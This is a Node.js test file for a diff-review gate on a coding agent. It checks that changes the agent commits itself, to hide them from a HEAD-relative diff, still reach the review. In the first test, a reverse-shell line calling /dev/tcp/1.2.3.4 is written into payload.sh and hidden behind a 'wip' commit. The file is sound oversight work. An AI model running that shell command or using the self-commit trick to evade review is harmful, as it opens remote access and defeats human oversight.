/**
 * Integration test for the C2 self-commit bypass fix. Run with:  node --test
 *
 * The diff-review gate must see EVERYTHING the coding agent changed since the
 * pre-run tip — including changes the agent COMMITS itself to hide them from a
 * HEAD-relative `git diff`. stagedDiffSince(cwd, baseSha) diffs baseSha↔index, so
 * a self-commit is still captured. This drives a real throwaway git repo.
 */
const test = require('node:test');
const assert = require('node:assert');
const { execSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { stagedDiffSince } = require('./server');

function git(cwd, cmd) {
  return execSync(`git ${cmd}`, { cwd, encoding: 'utf8' });
}

function makeRepo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'iw-diffcap-'));
  git(dir, 'init -q');
  git(dir, 'config user.email a@b.c');
  git(dir, 'config user.name tester');
  git(dir, 'commit -q --allow-empty -m base');
  return dir;
}

test('captures a payload the agent COMMITTED itself (the bypass)', () => {
  const dir = makeRepo();
  const base = git(dir, 'rev-parse HEAD').trim();

  // Agent hides its payload behind its own commit...
  fs.writeFileSync(path.join(dir, 'payload.sh'), 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n');
  git(dir, 'add -A');
  git(dir, 'commit -q -m "wip"');
  // ...then leaves only a trivial residual change staged/unstaged.
  fs.writeFileSync(path.join(dir, 'README.md'), 'typo fix\n');

  const diff = stagedDiffSince(dir, base);
  assert.ok(diff.includes('payload.sh'), 'self-committed file must appear in the reviewed diff');
  assert.ok(diff.includes('/dev/tcp/'), 'self-committed payload content must be reviewable');
  assert.ok(diff.includes('README.md'), 'the residual uncommitted change is also captured');
});

test('captures new untracked files and modifications since base', () => {
  const dir = makeRepo();
  const base = git(dir, 'rev-parse HEAD').trim();
  fs.writeFileSync(path.join(dir, 'new.ts'), 'export const x = 1;\n');
  const diff = stagedDiffSince(dir, base);
  assert.ok(diff.includes('new.ts'));
  assert.ok(diff.includes('+export const x = 1;'));
});

test('throws when no base SHA is provided (fail-closed at the caller)', () => {
  const dir = makeRepo();
  assert.throws(() => stagedDiffSince(dir, ''), /no base SHA/);
});
